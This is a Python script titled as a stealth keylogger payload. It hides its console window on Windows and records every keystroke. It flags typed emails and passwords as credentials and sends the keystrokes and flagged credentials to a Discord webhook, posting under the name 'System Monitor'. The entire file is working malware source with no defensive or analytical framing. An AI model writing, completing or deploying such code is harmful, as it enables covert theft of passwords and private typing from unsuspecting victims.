# GRAE-X LABS - STEALTH KEYLOGGER PAYLOAD
import os
import sys
import time
import requests
import threading
from datetime import datetime
from pynput import keyboard

# Hide window on Windows
if sys.platform == "win32":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

class DiscordWebhookSender:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        
    def send_message(self, content):
        try:
            message = {"content": content, "username": "System Monitor"}
            requests.post(self.webhook_url, json=message, timeout=10)
            return True
        except Exception:
            return False
    
    def send_keystroke(self, keystroke_data, credentials_detected=False):
        if credentials_detected:
            content = f"🚨 **CREDENTIALS DETECTED** ```{keystroke_data}```"
        else:
            content = f"🔐 **Key Captured** ```{keystroke_data}```"
        
        self.send_message(content)

class CredentialDetector:
    def __init__(self):
        self.buffer = ""
        self.credential_keywords = ['password', 'login', 'username', 'email', '@gmail', '@yahoo', '@hotmail']
        
    def analyze_keystroke(self, key_data):
        if 'CHAR:' in key_data:
            char = key_data.split("'")[1]
            self.buffer += char
            
            # Check for credential patterns
            buffer_lower = self.buffer.lower()
            
            # Detect email patterns
            if '@' in self.buffer and '.' in self.buffer:
                return True, f"EMAIL DETECTED: {self.buffer}"
            
            # Detect password field (common after 'password' keyword)
            if 'password' in buffer_lower and len(self.buffer) > 8:
                return True, f"PASSWORD TYPED: {self.buffer}"
            
            # Clear buffer if it gets too long
            if len(self.buffer) > 50:
                self.buffer = ""
                
        return False, ""

class StealthKeylogger:
    def __init__(self, webhook_url):
        self.discord_sender = DiscordWebhookSender(webhook_url)
        self.credential_detector = CredentialDetector()
        self.keystrokes = []
        self.is_running = True
        
        # Send startup notification
        self.discord_sender.send_message("🟢 **SYSTEM ACTIVATED** - Keylogger started successfully")
        
    def on_key_press(self, key):
        if not self.is_running:
            return False
            
        try:
            timestamp = datetime.now().strftime('%H:%M:%S')
            
            if hasattr(key, 'char') and key.char:
                key_data = f"CHAR: '{key.char}'"
            else:
                key_name = str(key).replace('Key.', '')
                key_data = f"SPECIAL: [{key_name}]"
            
            log_entry = f"{timestamp} | {key_data}"
            self.keystrokes.append(log_entry)
            
            # Check for credentials
            credentials_detected, credential_data = self.credential_detector.analyze_keystroke(key_data)
            
            if credentials_detected:
                # Immediate alert for credentials
                self.discord_sender.send_keystroke(credential_data, credentials_detected=True)
            elif len(self.keystrokes) % 10 == 0:  # Send batch every 10 keys
                recent_keys = "\n".join(self.keystrokes[-10:])
                self.discord_sender.send_keystroke(f"Recent Activity:\n{recent_keys}")
                
        except Exception:
            pass
            
        return True
    
    def on_key_release(self, key):
        return True
    
    def start(self):
        with keyboard.Listener(
            on_press=self.on_key_press,
            on_release=self.on_key_release
        ) as listener:
            listener.join()

def main():
    # REPLACE WITH YOUR ACTUAL DISCORD WEBHOOK
    WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
    
    keylogger = StealthKeylogger(WEBHOOK_URL)
    keylogger.start()

if __name__ == "__main__":
    main()